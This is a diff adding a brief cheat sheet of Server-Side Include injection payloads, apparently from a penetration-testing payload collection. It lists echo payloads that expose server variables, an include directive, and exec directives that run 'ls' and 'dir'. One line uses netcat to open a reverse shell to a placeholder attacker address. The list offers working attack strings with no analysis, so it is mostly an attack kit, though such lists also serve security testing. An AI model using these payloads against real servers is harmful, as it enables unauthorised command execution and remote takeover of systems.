@@ -1,0 +1,18 @@
+# ---- General payload
+<!--#directive param="Value"-->
+
+# ---- echo 
+# ------ basic payload
+<!--#echo var="DOCUMENT_NAME"-->
+<!--#echo var="DATE_LOCAL"-->
+
+# ---- include 
+# ------ basic payload
+<!--#include virtual="/index.html"-->
+
+# ---- command execution 
+# ------ basic payload
+<!--#exec cmd="ls"-->
+<!--#exec cmd="dir"-->
+<!--#exec cmd="nc <attacker_ip> <attacker_port> -e /bin/sh"-->
+
